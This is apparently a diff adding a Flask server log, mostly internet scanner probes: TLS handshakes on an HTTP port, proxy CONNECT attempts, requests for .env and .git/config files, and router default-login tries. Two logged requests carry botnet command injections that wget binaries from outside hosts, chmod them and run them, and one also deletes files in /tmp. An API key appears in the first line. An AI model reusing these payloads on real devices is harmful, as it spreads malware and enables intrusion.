+DEBUG:urllib3.connectionpool:http://api.openweathermap.org:80 "GET /data/2.5/weather?APPID=c6d8f8d28ed380de9c13b5c4316244b3&q=New+Haven HTTP/1.1" 200 528
+DEBUG:main:City: New Haven Temperature: 272.62
+INFO:werkzeug:149.152.191.2 - - [11/Feb/2025 21:35:40] "GET /temps HTTP/1.1" 200 -
+INFO:werkzeug:198.235.24.27 - - [11/Feb/2025 22:08:59] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:205.210.31.93 - - [11/Feb/2025 22:48:41] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:205.210.31.93 - - [11/Feb/2025 22:48:41] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x99ÑØ\x8e\x8d@/Þ¥nÂOÄÒÌãOHÂ9Òz\x83åÚ\x85îÜ»a\x89Ð \x9d*ã\x8fwQ\x02(iþµ#|j\x84³ÕPý3\x02\x8c\x1c~ëÙ\x10Ç-\x8c(\x0b\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:205.210.31.93 - - [11/Feb/2025 22:48:41] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.93 - - [11/Feb/2025 22:48:41] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03r\x81'\x05/]Äxò\x129ü3Ye\x94\x9b\x09ø\x8cÛx£MæqÚ!{eì\x1d\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+INFO:werkzeug:118.173.185.204 - - [11/Feb/2025 23:05:01] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:205.210.31.9 - - [11/Feb/2025 23:05:29] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:205.210.31.9 - - [11/Feb/2025 23:05:29] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03_îÑ~ØY\x7fê\x93ß÷]?+{\x1e\x9eêÕ\x18§ëÀØ÷\x19A\x0d­óç× \x9d\x8aùdd1M\x17ZCÃþ\x97ÊÖÚ\x02\x86\x8aDS\x19>lúµNÎ\x17»só\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:205.210.31.9 - - [11/Feb/2025 23:05:29] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.9 - - [11/Feb/2025 23:05:29] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03]ò\x7f\x95Â Æ Ì¿±\x95P\x99øä;\x85\x09ô\x8bËCöËkÖØ\x84^\x17Ç\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+INFO:werkzeug:205.210.31.250 - - [11/Feb/2025 23:40:22] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:45.148.10.242 - - [11/Feb/2025 23:48:08] "[33mCONNECT httpbin.org:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:195.178.110.163 - - [12/Feb/2025 00:21:56] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03í[ÅP_jé\x99ô*íYt\x12Ë\x08\x89\x98')
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:21:56] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03í[ÅP_jé\x99ô*íYt\x12Ë\x08\x89\x98[0m" 400 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:21:56] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:21:56] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:01] "[33mGET /configuration/.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:01] "[33mGET /.env.uat HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:01] "[33mGET /core/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:02] "[33mGET /media/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:02] "[33mGET /docker-compose.prod.yml HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:03] "[33mGET /.env.config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:03] "[33mGET /dev/.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:04] "[33mGET /.env.development.local HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:04] "[33mGET /.env.live HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:05] "[33mGET /.env.save HTTP/1.1[0m" 404 -
+INFO:werkzeug:195.178.110.163 - - [12/Feb/2025 00:22:05] "[33mGET /.env.dev.local HTTP/1.1[0m" 404 -
+ERROR:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x10|ÆqÌÒÝ[¿uäNááZ[hn/Ìãäå9>}4\x88;\x0d\x0dV\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+ERROR:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9bñ\x19ëc¥\x7f\x7f¸\x01ä\x8c\x9bf(Dãà'@\x9f·ÖJ\x8bËDØ¶\x80\x0eÜ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
+INFO:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9bñ\x19ëc¥\x7f\x7f¸\x01ä\x8c\x9bf(Dãà'@\x9f·ÖJ\x8bËDØ¶\x80\x0eÜ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] "[33mGET /download/powershell/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.74.174 - - [12/Feb/2025 00:24:53] "[33mGET /get.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:194.120.230.215 - - [12/Feb/2025 00:34:13] "[33mCONNECT checkip.amazonaws.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.225.3.64 - - [12/Feb/2025 01:09:58] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.225.3.64 - - [12/Feb/2025 01:09:58] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 01:11:13] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:205.210.31.147 - - [12/Feb/2025 01:13:38] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:64.62.197.208 - - [12/Feb/2025 01:37:53] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.62.197.208 - - [12/Feb/2025 01:37:53] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x18æ\x02¼³\x87\x9f÷íe\x04Vn\x09O¿31§Õð\x02àZ\x9f_o\x00:`f\x89\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:104.152.52.206 - - [12/Feb/2025 02:55:09] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:185.224.128.17 - - [12/Feb/2025 03:00:55] "[33mCONNECT example.com:80 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:185.224.128.17 - - [12/Feb/2025 03:01:09] code 400, message Bad request syntax ('\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00')
+INFO:werkzeug:185.224.128.17 - - [12/Feb/2025 03:01:09] "[31m[1m\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00[0m" 400 -
+ERROR:werkzeug:185.224.128.17 - - [12/Feb/2025 03:01:09] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:185.224.128.17 - - [12/Feb/2025 03:01:09] "[31m[1m\x05\x01\x00[0m" 400 -
+ERROR:werkzeug:109.236.61.249 - - [12/Feb/2025 03:29:34] code 400, message Bad request version ('}')
+INFO:werkzeug:109.236.61.249 - - [12/Feb/2025 03:29:34] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+INFO:werkzeug:20.118.64.66 - - [12/Feb/2025 04:48:52] "[33mGET /hudson HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.169 - - [12/Feb/2025 05:09:06] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 05:39:48] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:8.222.151.174 - - [12/Feb/2025 06:22:13] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:8.222.151.174 - - [12/Feb/2025 06:22:14] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:8.222.151.174 - - [12/Feb/2025 06:22:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:141.98.11.35 - - [12/Feb/2025 06:47:34] "[33mGET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+arm4+arm7;wget+http:/\\/176.65.140.135/efefa7;chmod+777+efefa7;./efefa7+jaws;wget+http:/\\/176.65.140.135/drea4;chmod+777+drea4;./drea4+jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.93.107.98 - - [12/Feb/2025 06:59:20] "[33mCONNECT ip-api.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:97.107.135.230 - - [12/Feb/2025 07:48:32] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:97.107.135.230 - - [12/Feb/2025 07:48:32] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03î¢\x01\x8f¬9\x9c$\x91ÏJ\x81\x8cþ\x1d\x8d5m7<÷\x88Ýcä î8ÖyHÜ Ú\x14\x14Ú® \x04\x04ù\x06Ô\x12Æ\x05\x0e^½³«õ\x8cÎ'\x8f{ôcj²ptÛ\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:119.187.5.90 - - [12/Feb/2025 08:21:51] "[33mGET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 09:35:55] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:78.108.177.51 - - [12/Feb/2025 10:32:43] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:51.8.222.203 - - [12/Feb/2025 10:41:48] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:11] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03®\x7fû?\x9fO¿')
+INFO:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:11] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03®\x7fû?\x9fO¿\x09e$OX6_:\x14[0m" 400 -
+ERROR:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:11] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:11] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x01\x0b\x1dý¨"\x1cÝû~R\x81ù\x93c<$\x9b,\x7f\x9c\x178\x91¢ú\x16ú\x1fÊÁ\x86\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:12] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:12] "[33mGET /download/powershell/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:209.97.141.247 - - [12/Feb/2025 11:27:12] "[33mGET /get.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 12:57:58] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:156.229.233.162 - - [12/Feb/2025 13:21:13] "[33mCONNECT bernd.group:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 13:47:51] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+ERROR:werkzeug:172.169.107.191 - - [12/Feb/2025 14:48:43] code 400, message Bad request syntax ('MGLNDD_35.193.141.194_8080')
+INFO:werkzeug:172.169.107.191 - - [12/Feb/2025 14:48:43] "[31m[1mMGLNDD_35.193.141.194_8080[0m" 400 -
+INFO:werkzeug:220.132.100.145 - - [12/Feb/2025 15:31:57] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:185.180.140.106 - - [12/Feb/2025 17:05:42] "[33mGET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 17:28:04] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.183.7.45 - - [12/Feb/2025 17:32:07] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.43.33.218 - - [12/Feb/2025 17:56:45] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [12/Feb/2025 17:57:27] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [12/Feb/2025 17:57:28] "[33mGET /logon.htm HTTP/1.1[0m" 404 -
+INFO:werkzeug:202.131.234.26 - - [12/Feb/2025 17:57:45] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.255.57.58 - - [12/Feb/2025 18:19:32] "[33mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.255.57.58 - - [12/Feb/2025 18:36:36] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+INFO:werkzeug:139.99.35.42 - - [12/Feb/2025 19:06:49] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:139.99.35.43 - - [12/Feb/2025 19:15:47] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.231 - - [12/Feb/2025 19:16:54] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:45.79.181.179 - - [12/Feb/2025 19:43:14] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+INFO:werkzeug:45.79.181.179 - - [12/Feb/2025 19:43:14] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+ERROR:werkzeug:45.79.181.179 - - [12/Feb/2025 19:43:14] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+INFO:werkzeug:45.79.181.179 - - [12/Feb/2025 19:43:14] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+ERROR:werkzeug:69.164.212.13 - - [12/Feb/2025 19:52:49] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:69.164.212.13 - - [12/Feb/2025 19:52:49] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ß^Q§¨¸2\x9fì&¦\x01¶°="üÓ;»^À\x12¹\x90[?¿\x88\x81´H HIä¼È\x8få\x17X\x84À0\x17¡=\x1a9Æíø)(NC®è\x1eGês\x88u\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:46.19.143.26 - - [12/Feb/2025 20:14:20] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [12/Feb/2025 20:14:20] "[33mGET /logon.htm HTTP/1.1[0m" 404 -
+INFO:werkzeug:117.206.79.74 - - [12/Feb/2025 20:23:26] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.206.79.74:37746/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0[0m" 404 -
+ERROR:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:01] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:01] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03I_ø>ß(àìPw\x8c\x12B\x10\x8eÂÔ£hÖÕÃ½\x0d3Õwá×\x88ñ\x06\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+ERROR:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:01] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:01] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03mÖ\x98q\x89f C#\x17ñ\x8e1\x92\x11[·dõv)Ò\x14,WÐ0l\x04EH8\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:02] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:02] "[33mGET /download/powershell/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:178.128.94.166 - - [12/Feb/2025 20:49:03] "[33mGET /get.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [12/Feb/2025 20:58:19] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:47.245.117.19 - - [12/Feb/2025 21:43:07] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:47.245.117.19 - - [12/Feb/2025 21:43:08] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.31 - - [12/Feb/2025 21:43:29] "[33mCONNECT ifconfig.co:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [12/Feb/2025 21:45:53] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [12/Feb/2025 21:45:53] "[33mGET /logon.htm HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.93.107.98 - - [12/Feb/2025 22:00:46] "[33mCONNECT ip-api.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:37.183.150.87 - - [12/Feb/2025 22:02:22] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:193.68.89.31 - - [12/Feb/2025 22:05:10] code 400, message Bad request syntax ('\x04\x01\x01»¬C¨j\x00')
+INFO:werkzeug:193.68.89.31 - - [12/Feb/2025 22:05:10] "[31m[1m\x04\x01\x01»¬C¨j\x00[0m" 400 -
+ERROR:werkzeug:193.68.89.31 - - [12/Feb/2025 22:05:13] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:193.68.89.31 - - [12/Feb/2025 22:05:13] "[31m[1m\x05\x01\x00[0m" 400 -
+INFO:werkzeug:185.247.137.70 - - [12/Feb/2025 22:08:54] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.208.104.183 - - [12/Feb/2025 22:32:31] "[33mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0[0m" 404 -
+ERROR:werkzeug:205.210.31.132 - - [12/Feb/2025 23:27:52] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:205.210.31.132 - - [12/Feb/2025 23:27:52] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03iy0c\x0eò¦x\x15â%ÌÌG%;."\x8eúÊ÷£y«§"9\x05En\x90 \x81ô\x89}=B­\x8bxßí\x00¨O\x9d\x85CÓ5E±?çâýÓ«\x88D:xî\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:205.210.31.132 - - [12/Feb/2025 23:27:52] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.132 - - [12/Feb/2025 23:27:52] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Ä§\x85\x85kÛ>\x09À\x1e^\x12´õ&\x81\x01~_þË\x91ÍÈ¤\x92\x90\x87Îm\x08\x8d\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+INFO:werkzeug:157.231.51.20 - - [12/Feb/2025 23:37:01] "[33mPOST /goform/set_LimitClient_cfg HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.199.180.28 - - [13/Feb/2025 00:35:44] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [13/Feb/2025 00:46:48] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:205.210.31.251 - - [13/Feb/2025 02:39:25] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:205.210.31.51 - - [13/Feb/2025 03:05:59] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:205.210.31.51 - - [13/Feb/2025 03:05:59] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x036$âÜ\x8bazÔU\x83\x04\x09)\x8bÍ@$à¹\x12.\x18ÎO£ÞìÔxw\x9bæ ú5\x00&vn¾\x09Má\x1fÑhÁe]@Ið\x8f\x8f³ÅÙ4èº+\x99&c;\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+ERROR:werkzeug:205.210.31.51 - - [13/Feb/2025 03:05:59] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03·\\I«\x08â³\x19Ao|³fÕ÷\x9aWj\x83`äÐ\x0f'ßa`o\x98åÑ\x97\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+INFO:werkzeug:205.210.31.51 - - [13/Feb/2025 03:05:59] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03·\\I«\x08â³\x19Ao|³fÕ÷\x9aWj\x83`äÐ\x0f'ßa`o\x98åÑ\x97\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 03:32:52] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:194.120.230.215 - - [13/Feb/2025 03:41:02] "[33mCONNECT checkip.amazonaws.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:194.120.230.215 - - [13/Feb/2025 03:41:02] "[33mCONNECT icanhazip.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:65.49.20.69 - - [13/Feb/2025 03:46:13] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:65.49.20.69 - - [13/Feb/2025 03:46:13] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Þ£ÅÀìÛ\x86\x95oÒ\x1e\x85\x1a\x0e1j\x7fÛy\x16o\x7f\x84Ú\x0ef~\x96®Á\x8f¡\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 04:22:19] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:122.96.31.50 - - [13/Feb/2025 05:21:04] "[33mGET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [13/Feb/2025 05:23:15] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 05:33:22] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.9 - - [13/Feb/2025 05:50:36] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.236.61.249 - - [13/Feb/2025 06:06:22] code 400, message Bad request version ('}')
+INFO:werkzeug:109.236.61.249 - - [13/Feb/2025 06:06:22] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 06:26:56] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:152.42.136.45 - - [13/Feb/2025 06:39:28] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [13/Feb/2025 07:09:33] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [13/Feb/2025 07:09:33] "[33mGET /logon.htm HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.226.98.14 - - [13/Feb/2025 07:24:42] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.226.98.14 - - [13/Feb/2025 07:24:59] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.226.98.14 - - [13/Feb/2025 07:25:26] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 07:30:03] code 400, message Bad request syntax ('\x04\x01\x00\x19Wøa$\x00')
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 07:30:03] "[31m[1m\x04\x01\x00\x19Wøa$\x00[0m" 400 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 07:31:08] code 400, message Bad request syntax ('\x04\x01\x00\x19Wøa$\x00')
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 07:31:08] "[31m[1m\x04\x01\x00\x19Wøa$\x00[0m" 400 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 07:32:08] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 07:32:08] "[31m[1m\x05\x01\x00[0m" 400 -
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 07:32:08] "[33mCONNECT smtp.mail.yahoo.com:25 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:172.104.31.208 - - [13/Feb/2025 07:51:48] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:172.104.31.208 - - [13/Feb/2025 07:51:48] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x10\x17\x81!\x13èõ<ze\x96`\x18C¨]\x98Ix\x08ÐÃ\x90N\x88\x98\x83\x89ÄÑ\x08\x8a m¶IN\x9f\x89ÞýÁ§ÆrÅÁåJZCÂ\x85öipK:¬\x9eiâà~ð\x00&Ì©Ì¨À+À/À,À0À\x09À\x13À[0m" 400 -
+INFO:werkzeug:59.92.152.51 - - [13/Feb/2025 07:55:12] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 08:00:28] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 09:06:43] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [13/Feb/2025 09:29:09] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.19.143.26 - - [13/Feb/2025 09:29:10] "[33mGET /logon.htm HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.144 - - [13/Feb/2025 09:48:21] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:45.135.194.28 - - [13/Feb/2025 09:50:15] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.68.89.51 - - [13/Feb/2025 09:53:42] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.120.177.190 - - [13/Feb/2025 09:56:08] "[33mCONNECT atracon.es:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:87.67.239.48 - - [13/Feb/2025 09:56:18] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 09:59:30] code 400, message Bad request syntax ('\x04\x01\x00P¹\x190h\x00')
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 09:59:30] "[31m[1m\x04\x01\x00P¹\x190h\x00[0m" 400 -
+INFO:werkzeug:78.108.177.50 - - [13/Feb/2025 09:59:32] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 10:00:03] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.66.83.48 - - [13/Feb/2025 10:00:03] "[31m[1m\x05\x01\x00[0m" 400 -
+ERROR:werkzeug:80.66.83.48 - - [13/Feb/2025 10:01:08] code 400, message Bad request syntax ('\x04\x01\x00P¹\x190h\x00')
